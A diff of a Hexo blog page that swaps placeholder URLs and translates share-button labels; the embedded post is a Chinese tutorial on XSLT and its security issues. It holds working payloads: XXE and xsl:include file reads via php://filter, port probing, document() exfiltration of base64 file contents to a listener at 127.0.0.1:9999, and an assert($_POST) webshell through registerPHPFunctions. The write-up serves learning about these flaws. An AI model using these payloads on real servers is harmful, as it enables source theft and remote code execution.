@@ -11,11 +11,11 @@
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"\n\n什么是XSLT可扩展样式表语言转换(XSLT)是一种基于XML的语言，和专门的处理软件一起使用，用于XML文档转换。虽然这个处理过程被称作“转换”，但并没有改变原始文档，而是在原文档内容的基础上创建了一个新的XML文档。然后, 这个新文档会被处理器序列化（输出）为标准的XML语法或其他格式，如HTML或纯文本。XSLT最常用于不同XML模式间的数据转换，或用于将XML数据转换为网页或PDF文档\n就是说XSLT 可以把 XML文档转换为其他类型的文档\n举个栗子1.xml写入\n123456&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;?xml-stylesheet type=\"text/xsl\" href=\"1.xsl\"?&gt;&lt;root&gt;    &lt;country&gt;China&lt;/country&gt;    &lt;company&gt;abc&lt;/company&gt;&lt;/root&gt;\n\n1.xsl写入\n12345678910111213141516171819202122232425&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;&lt;xsl:template match=\"/\"&gt;  &lt;html&gt;  &lt;body&gt;    &lt;h2&gt;My address&lt;/h2&gt;    &lt;table border=\"1\"&gt;    &lt;tr bgcolor=\"#9acd32\"&gt;      &lt;th align=\"left\"&gt;country&lt;/th&gt;      &lt;th align=\"left\"&gt;company&lt;/th&gt;    &lt;/tr&gt;    &lt;xsl:for-each select=\"root\"&gt;    &lt;tr&gt;      &lt;td&gt;&lt;xsl:value-of select=\"country\"/&gt;&lt;/td&gt;      &lt;td&gt;&lt;xsl:value-of select=\"company\"/&gt;&lt;/td&gt;    &lt;/tr&gt;    &lt;/xsl:for-each&gt;    &lt;/table&gt;  &lt;/body&gt;  &lt;/html&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;\n\n解释一下\n&lt;xsl:for-each&gt;  选取指定节点的集中的每个元素\n1&lt;xsl:for-each select=\"root\"&gt;  &lt;/xsl:for-each&gt;  这里选取xml文档中 root节点\n\n&lt;xsl:value-of&gt;  用于提取某个选定节点的值，并把值添加到转换的输出流中\n1&lt;xsl:value-of select=&quot;country&quot;/&gt; 这里的country对应的就是xml文档中&lt;country&gt;China&lt;/country&gt; 这个元素\n\n结果\n\n进一步上面只使用了xml xsl两种文件来进行转换，但是有的时候，同一个xml文档，在一个地方可能被要求转换，在另一个地方不要求转换，这就需要动态的来调用\nphp中可以使用XSLTProcessor 这个类来进行转换\n1.php写入\n12345678910111213&lt;?php   $xslDoc = new DOMDocument();   $xslDoc-&gt;load(\"1.xsl\");   $xmlDoc = new DOMDocument();   $xmlDoc-&gt;load(\"1.xml\");   $proc = new XSLTProcessor();   $proc-&gt;importStylesheet($xslDoc);   echo $proc-&gt;transformToXML($xmlDoc);?&gt;\n\n解释一下代码\nXSLTProcessor 是php中一个用来转换xml文档的类，适用于把一个xml文档转换成另一个类型的xml文档\nimportStylesheet 是XSLTProcessor类的一个方法，用来导入xslt样式表\ntransformToXML 也是XSLTProcessor类的一个方法，适用importStylesheet方法导入的xslt样式表转换xml文档\n访问一下1.php\n\n和上面一样的结果，把文件名改成参数，就可以更加方便的调用，\n12345678910111213&lt;?php   $xslDoc = new DOMDocument();   $xslDoc-&gt;load($_GET[&apos;xsl&apos;]);   $xmlDoc = new DOMDocument();   $xmlDoc-&gt;load($_GET[&apos;xml&apos;]);   $proc = new XSLTProcessor();   $proc-&gt;importStylesheet($xslDoc);   echo $proc-&gt;transformToXML($xmlDoc);?&gt;\n\n安全问题xxe读文件 \n类似于传统的xml xslt同样存在这个问题\n12345678910&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY shit SYSTEM \"php://filter/read=convert.base64-encode/resource=1.php\"&gt;   ]&gt;&lt;xsl:stylesheet version=\"1.0\"xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;&lt;xsl:template match=\"/root\"&gt;  &amp;shit;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;\n\n结果\n\nxsl:includexslt文档中这么介绍xsl:include\nxsl:include 元素是顶层元素（top-level element），把一个样式表中的样式表内容包含到另一个样式表中\n1&lt;xsl:include href=&quot;URI&quot;/&gt;\n\n文档内还写明 该元素必须是 &lt;xsl:stylesheet&gt; 或 &lt;xsl:transform&gt; 的子节点。\n测试一下\n端口探测1.xsl写入\n123456&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;xsl:stylesheet version=\"1.0\"xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;&lt;xsl:include href=\"http://127.0.0.1:9999/\" /&gt;&lt;/xsl:stylesheet&gt;\n\n1.php写入\n123456789&lt;?php   $xslDoc = new DOMDocument();   $xslDoc-&gt;load('1.xsl',LIBXML_NOENT);   $xmlDoc = new DOMDocument();   $xmlDoc-&gt;load('1.xml');   $proc = new XSLTProcessor();   $proc-&gt;importStylesheet($xslDoc);   echo $proc-&gt;transformToXML($xmlDoc);?&gt;\n\n结果\n\n读文件1.xsl写入\n123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;xsl:stylesheet version=&quot;1.0&quot;xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;&lt;xsl:include href=&quot;php://filter/read=convert.base64-encode/resource=1.php&quot; /&gt;&lt;/xsl:stylesheet&gt;\n\n这里由于转换的问题 transformToXML 导致报错只出现了一行内容\n\n注意   php默认适用的是libxml libxml2.6版本以后默认禁止了外部实体导入，但是可以使用LIBXML_NOENT这个选项加载外部实体\n得找一个办法来解决报错只显示一行内容的问题\nno.1  再找一下有没有其他的可以导入外部文档的功能\nno.2 利用include可以包含url的特点，外带数据 \n在xslt中还找到一个document，可以用来访问外部文档\ndocumentdocument() 函数用于访问外部 XML 文档中的节点 这也就是说 它可以导入外部文件\n12345document(object,node-set)object 必需。定义外部 XML 文档的URI。node-set 可选。用于解析相对 URI。&lt;xsl:value-of select=&quot;document(&apos;1.xml&apos;)&quot;/&gt;\n\n读文件这里看到sky师傅用了一个连接加外带的方式 把数据传出来\n12345678&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;xsl:stylesheet version=\"1.0\"xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;&lt;xsl:variable name=\"name1\" select=\"document('php://filter/read=convert.base64-encode/resource=2.php')\" /&gt;&lt;xsl:variable name=\"name2\" select=\"concat('http://127.0.0.1:9999/?a=', $name1)\" /&gt;&lt;xsl:variable name=\"name3\" select=\"document($name2)\" /&gt;&lt;/xsl:stylesheet&gt;\n\nconcat把两个字符串连接起来 最后在调用document 向外发送数据 本地监听9999端口，拿到数据\n探测端口1.xsl写入\n1234567891011121314151617181920212223242526&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;&lt;xsl:template match=\"/\"&gt;  &lt;html&gt;  &lt;body&gt;    &lt;h2&gt;My address&lt;/h2&gt;    &lt;table border=\"1\"&gt;    &lt;tr bgcolor=\"#9acd32\"&gt;      &lt;th align=\"left\"&gt;country&lt;/th&gt;      &lt;th align=\"left\"&gt;company&lt;/th&gt;    &lt;/tr&gt;    &lt;xsl:for-each select=\"root\"&gt;    &lt;tr&gt;      &lt;td&gt;&lt;xsl:value-of select=\"country\"/&gt;&lt;/td&gt;      &lt;td&gt;&lt;xsl:value-of select=\"company\"/&gt;&lt;/td&gt;      &lt;xsl:value-of select=\"document('http://127.0.0.1:9999')\"/&gt;    &lt;/tr&gt;    &lt;/xsl:for-each&gt;    &lt;/table&gt;  &lt;/body&gt;  &lt;/html&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;\n\n访问一下1.php\n\n并且这里不需要开启外部实体\n解析一句话test.php写入\n123456789101112131415&lt;?php$xml='&lt;root&gt;assert($_POST[asd]);&lt;/root&gt;';$xsl='&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:qwe=\"http://php.net/xsl\"&gt;  &lt;xsl:template match=\"/root\"&gt;    &lt;xsl:value-of select=\"qwe:function(\\'assert\\',string(.))\"/&gt; &lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;';$xmldoc = DOMDocument::loadXML($xml);$xsldoc = DOMDocument::loadXML($xsl);$proc = new XSLTProcessor();$proc-&gt;registerPHPFunctions();$proc-&gt;importStyleSheet($xsldoc);$proc-&gt;transformToXML($xmldoc);?&gt;\n\n解释一下上面的代码\n$xml=&#39;&lt;root&gt;assert($_POST[asd]);&lt;/root&gt;&#39;; 定义了一个xml元素\nxmlns:qwe=&quot;http://php.net/xsl&quot; 导入命令空间 这里导入的是php函数\n&lt;xsl:value-of select=&quot;qwe:function(\\&#39;assert\\&#39;,string(.))&quot;/&gt; 这里表示将匹配到的内容，作为参数，传给assert函数\n&lt;xsl:template match=”/root”&gt; 这里将匹配root节点的内容，assert($_POST[asd]);  下面的xsl:value-of会提取匹配到的内容，然后交给了后面的函数来执行 最终导致了一句话被解析\n结果\n\n参考链接\nhttps://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/#XSLT\nhttps://paper.seebug.org/36/#xsltwebshell\n","dateCreated":"2019-11-18T19:39:36+08:00","dateModified":"2020-02-26T14:33:15+08:00","datePublished":"2019-11-18T19:39:36+08:00","description":"","headline":"认识xslt","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/11/18/认识xslt/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://yoursite.com/2019/11/18/认识xslt/"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"\n\n什么是XSLT可扩展样式表语言转换(XSLT)是一种基于XML的语言，和专门的处理软件一起使用，用于XML文档转换。虽然这个处理过程被称作“转换”，但并没有改变原始文档，而是在原文档内容的基础上创建了一个新的XML文档。然后, 这个新文档会被处理器序列化（输出）为标准的XML语法或其他格式，如HTML或纯文本。XSLT最常用于不同XML模式间的数据转换，或用于将XML数据转换为网页或PDF文档\n就是说XSLT 可以把 XML文档转换为其他类型的文档\n举个栗子1.xml写入\n123456&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;?xml-stylesheet type=\"text/xsl\" href=\"1.xsl\"?&gt;&lt;root&gt;    &lt;country&gt;China&lt;/country&gt;    &lt;company&gt;abc&lt;/company&gt;&lt;/root&gt;\n\n1.xsl写入\n12345678910111213141516171819202122232425&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;&lt;xsl:template match=\"/\"&gt;  &lt;html&gt;  &lt;body&gt;    &lt;h2&gt;My address&lt;/h2&gt;    &lt;table border=\"1\"&gt;    &lt;tr bgcolor=\"#9acd32\"&gt;      &lt;th align=\"left\"&gt;country&lt;/th&gt;      &lt;th align=\"left\"&gt;company&lt;/th&gt;    &lt;/tr&gt;    &lt;xsl:for-each select=\"root\"&gt;    &lt;tr&gt;      &lt;td&gt;&lt;xsl:value-of select=\"country\"/&gt;&lt;/td&gt;      &lt;td&gt;&lt;xsl:value-of select=\"company\"/&gt;&lt;/td&gt;    &lt;/tr&gt;    &lt;/xsl:for-each&gt;    &lt;/table&gt;  &lt;/body&gt;  &lt;/html&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;\n\n解释一下\n&lt;xsl:for-each&gt;  选取指定节点的集中的每个元素\n1&lt;xsl:for-each select=\"root\"&gt;  &lt;/xsl:for-each&gt;  这里选取xml文档中 root节点\n\n&lt;xsl:value-of&gt;  用于提取某个选定节点的值，并把值添加到转换的输出流中\n1&lt;xsl:value-of select=&quot;country&quot;/&gt; 这里的country对应的就是xml文档中&lt;country&gt;China&lt;/country&gt; 这个元素\n\n结果\n\n进一步上面只使用了xml xsl两种文件来进行转换，但是有的时候，同一个xml文档，在一个地方可能被要求转换，在另一个地方不要求转换，这就需要动态的来调用\nphp中可以使用XSLTProcessor 这个类来进行转换\n1.php写入\n12345678910111213&lt;?php   $xslDoc = new DOMDocument();   $xslDoc-&gt;load(\"1.xsl\");   $xmlDoc = new DOMDocument();   $xmlDoc-&gt;load(\"1.xml\");   $proc = new XSLTProcessor();   $proc-&gt;importStylesheet($xslDoc);   echo $proc-&gt;transformToXML($xmlDoc);?&gt;\n\n解释一下代码\nXSLTProcessor 是php中一个用来转换xml文档的类，适用于把一个xml文档转换成另一个类型的xml文档\nimportStylesheet 是XSLTProcessor类的一个方法，用来导入xslt样式表\ntransformToXML 也是XSLTProcessor类的一个方法，适用importStylesheet方法导入的xslt样式表转换xml文档\n访问一下1.php\n\n和上面一样的结果，把文件名改成参数，就可以更加方便的调用，\n12345678910111213&lt;?php   $xslDoc = new DOMDocument();   $xslDoc-&gt;load($_GET[&apos;xsl&apos;]);   $xmlDoc = new DOMDocument();   $xmlDoc-&gt;load($_GET[&apos;xml&apos;]);   $proc = new XSLTProcessor();   $proc-&gt;importStylesheet($xslDoc);   echo $proc-&gt;transformToXML($xmlDoc);?&gt;\n\n安全问题xxe读文件 \n类似于传统的xml xslt同样存在这个问题\n12345678910&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY shit SYSTEM \"php://filter/read=convert.base64-encode/resource=1.php\"&gt;   ]&gt;&lt;xsl:stylesheet version=\"1.0\"xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;&lt;xsl:template match=\"/root\"&gt;  &amp;shit;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;\n\n结果\n\nxsl:includexslt文档中这么介绍xsl:include\nxsl:include 元素是顶层元素（top-level element），把一个样式表中的样式表内容包含到另一个样式表中\n1&lt;xsl:include href=&quot;URI&quot;/&gt;\n\n文档内还写明 该元素必须是 &lt;xsl:stylesheet&gt; 或 &lt;xsl:transform&gt; 的子节点。\n测试一下\n端口探测1.xsl写入\n123456&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;xsl:stylesheet version=\"1.0\"xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;&lt;xsl:include href=\"http://127.0.0.1:9999/\" /&gt;&lt;/xsl:stylesheet&gt;\n\n1.php写入\n123456789&lt;?php   $xslDoc = new DOMDocument();   $xslDoc-&gt;load('1.xsl',LIBXML_NOENT);   $xmlDoc = new DOMDocument();   $xmlDoc-&gt;load('1.xml');   $proc = new XSLTProcessor();   $proc-&gt;importStylesheet($xslDoc);   echo $proc-&gt;transformToXML($xmlDoc);?&gt;\n\n结果\n\n读文件1.xsl写入\n123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;xsl:stylesheet version=&quot;1.0&quot;xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;&lt;xsl:include href=&quot;php://filter/read=convert.base64-encode/resource=1.php&quot; /&gt;&lt;/xsl:stylesheet&gt;\n\n这里由于转换的问题 transformToXML 导致报错只出现了一行内容\n\n注意   php默认适用的是libxml libxml2.6版本以后默认禁止了外部实体导入，但是可以使用LIBXML_NOENT这个选项加载外部实体\n得找一个办法来解决报错只显示一行内容的问题\nno.1  再找一下有没有其他的可以导入外部文档的功能\nno.2 利用include可以包含url的特点，外带数据 \n在xslt中还找到一个document，可以用来访问外部文档\ndocumentdocument() 函数用于访问外部 XML 文档中的节点 这也就是说 它可以导入外部文件\n12345document(object,node-set)object 必需。定义外部 XML 文档的URI。node-set 可选。用于解析相对 URI。&lt;xsl:value-of select=&quot;document(&apos;1.xml&apos;)&quot;/&gt;\n\n读文件这里看到sky师傅用了一个连接加外带的方式 把数据传出来\n12345678&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;xsl:stylesheet version=\"1.0\"xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;&lt;xsl:variable name=\"name1\" select=\"document('php://filter/read=convert.base64-encode/resource=2.php')\" /&gt;&lt;xsl:variable name=\"name2\" select=\"concat('http://127.0.0.1:9999/?a=', $name1)\" /&gt;&lt;xsl:variable name=\"name3\" select=\"document($name2)\" /&gt;&lt;/xsl:stylesheet&gt;\n\nconcat把两个字符串连接起来 最后在调用document 向外发送数据 本地监听9999端口，拿到数据\n探测端口1.xsl写入\n1234567891011121314151617181920212223242526&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;&lt;xsl:template match=\"/\"&gt;  &lt;html&gt;  &lt;body&gt;    &lt;h2&gt;My address&lt;/h2&gt;    &lt;table border=\"1\"&gt;    &lt;tr bgcolor=\"#9acd32\"&gt;      &lt;th align=\"left\"&gt;country&lt;/th&gt;      &lt;th align=\"left\"&gt;company&lt;/th&gt;    &lt;/tr&gt;    &lt;xsl:for-each select=\"root\"&gt;    &lt;tr&gt;      &lt;td&gt;&lt;xsl:value-of select=\"country\"/&gt;&lt;/td&gt;      &lt;td&gt;&lt;xsl:value-of select=\"company\"/&gt;&lt;/td&gt;      &lt;xsl:value-of select=\"document('http://127.0.0.1:9999')\"/&gt;    &lt;/tr&gt;    &lt;/xsl:for-each&gt;    &lt;/table&gt;  &lt;/body&gt;  &lt;/html&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;\n\n访问一下1.php\n\n并且这里不需要开启外部实体\n解析一句话test.php写入\n123456789101112131415&lt;?php$xml='&lt;root&gt;assert($_POST[asd]);&lt;/root&gt;';$xsl='&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:qwe=\"http://php.net/xsl\"&gt;  &lt;xsl:template match=\"/root\"&gt;    &lt;xsl:value-of select=\"qwe:function(\\'assert\\',string(.))\"/&gt; &lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;';$xmldoc = DOMDocument::loadXML($xml);$xsldoc = DOMDocument::loadXML($xsl);$proc = new XSLTProcessor();$proc-&gt;registerPHPFunctions();$proc-&gt;importStyleSheet($xsldoc);$proc-&gt;transformToXML($xmldoc);?&gt;\n\n解释一下上面的代码\n$xml=&#39;&lt;root&gt;assert($_POST[asd]);&lt;/root&gt;&#39;; 定义了一个xml元素\nxmlns:qwe=&quot;http://php.net/xsl&quot; 导入命令空间 这里导入的是php函数\n&lt;xsl:value-of select=&quot;qwe:function(\\&#39;assert\\&#39;,string(.))&quot;/&gt; 这里表示将匹配到的内容，作为参数，传给assert函数\n&lt;xsl:template match=”/root”&gt; 这里将匹配root节点的内容，assert($_POST[asd]);  下面的xsl:value-of会提取匹配到的内容，然后交给了后面的函数来执行 最终导致了一句话被解析\n结果\n\n参考链接\nhttps://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/#XSLT\nhttps://paper.seebug.org/36/#xsltwebshell\n","dateCreated":"2019-11-18T19:39:36+08:00","dateModified":"2020-02-26T14:33:15+08:00","datePublished":"2019-11-18T19:39:36+08:00","description":"","headline":"认识xslt","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://p1keman.github.io/2019/11/18/认识xslt/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://p1keman.github.io/2019/11/18/认识xslt/"}</script>
     <meta name="description" content="什么是XSLT可扩展样式表语言转换(XSLT)是一种基于XML的语言，和专门的处理软件一起使用，用于XML文档转换。虽然这个处理过程被称作“转换”，但并没有改变原始文档，而是在原文档内容的基础上创建了一个新的XML文档。然后, 这个新文档会被处理器序列化（输出）为标准的XML语法或其他格式，如HTML或纯文本。XSLT最常用于不同XML模式间的数据转换，或用于将XML数据转换为网页或PDF文档">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="认识xslt">
-<meta property="og:url" content="http://yoursite.com/2019/11/18/认识xslt/index.html">
+<meta property="og:url" content="http://p1keman.github.io/2019/11/18/认识xslt/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="什么是XSLT可扩展样式表语言转换(XSLT)是一种基于XML的语言，和专门的处理软件一起使用，用于XML文档转换。虽然这个处理过程被称作“转换”，但并没有改变原始文档，而是在原文档内容的基础上创建了一个新的XML文档。然后, 这个新文档会被处理器序列化（输出）为标准的XML语法或其他格式，如HTML或纯文本。XSLT最常用于不同XML模式间的数据转换，或用于将XML数据转换为网页或PDF文档">
 <meta property="og:locale" content="zh-cn">
@@ -347,7 +347,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -358,7 +358,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/11/18/认识xslt/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/11/18/认识xslt/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -371,7 +371,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/11/18/认识xslt/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/11/18/认识xslt/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -384,7 +384,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/11/18/认识xslt/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/11/18/认识xslt/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -397,7 +397,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -462,7 +462,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -473,7 +473,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/11/18/认识xslt/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/11/18/认识xslt/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -486,7 +486,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/11/18/认识xslt/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/11/18/认识xslt/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -499,7 +499,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/11/18/认识xslt/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/11/18/认识xslt/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -512,7 +512,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -533,7 +533,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/11/18/认识xslt/"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/11/18/认识xslt/"
                         aria-label="分享到 Facebook"
                     >
                         <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
@@ -546,7 +546,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/11/18/认识xslt/"
+                        href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/11/18/认识xslt/"
                         aria-label="分享到 Twitter"
                     >
                         <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
@@ -559,7 +559,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://plus.google.com/share?url=http://yoursite.com/2019/11/18/认识xslt/"
+                        href="https://plus.google.com/share?url=http://p1keman.github.io/2019/11/18/认识xslt/"
                         aria-label="分享到 Google+"
                     >
                         <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
